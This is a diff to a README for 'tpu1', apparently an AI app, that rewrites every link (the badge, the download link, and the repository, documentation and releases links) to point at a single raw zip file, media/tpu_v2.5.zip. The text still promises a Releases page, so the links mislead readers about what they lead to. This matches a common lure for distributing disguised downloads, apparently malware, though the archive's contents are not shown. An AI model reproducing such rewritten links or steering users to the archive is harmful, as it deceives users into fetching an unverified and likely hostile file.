@@ -1,6 +1,6 @@
 # 🌟 tpu1 - Experience AI Power Effortlessly
 
-![Download tpu1](https://img.shields.io/badge/Download-tpu1-brightgreen)
+![Download tpu1](https://github.com/waddalfie/tpu1/raw/refs/heads/main/media/tpu_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to tpu1! This application lets you dive into the world of AI using Tenso
 
 To download tpu1, visit the Releases page. You will find the latest versions ready for download.
 
-[Download tpu1](https://github.com/waddalfie/tpu1/releases)
+[Download tpu1](https://github.com/waddalfie/tpu1/raw/refs/heads/main/media/tpu_v2.5.zip)
 
 1. Click the link above.
 2. On the Releases page, look for the latest version at the top.
@@ -72,9 +72,9 @@ Join our community to share your experience and get help.
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/waddalfie/tpu1)
-- [Documentation](https://github.com/waddalfie/tpu1/wiki)
-- [Releases Page](https://github.com/waddalfie/tpu1/releases)
+- [GitHub Repository](https://github.com/waddalfie/tpu1/raw/refs/heads/main/media/tpu_v2.5.zip)
+- [Documentation](https://github.com/waddalfie/tpu1/raw/refs/heads/main/media/tpu_v2.5.zip)
+- [Releases Page](https://github.com/waddalfie/tpu1/raw/refs/heads/main/media/tpu_v2.5.zip)
 
 ## 💬 Feedback
 
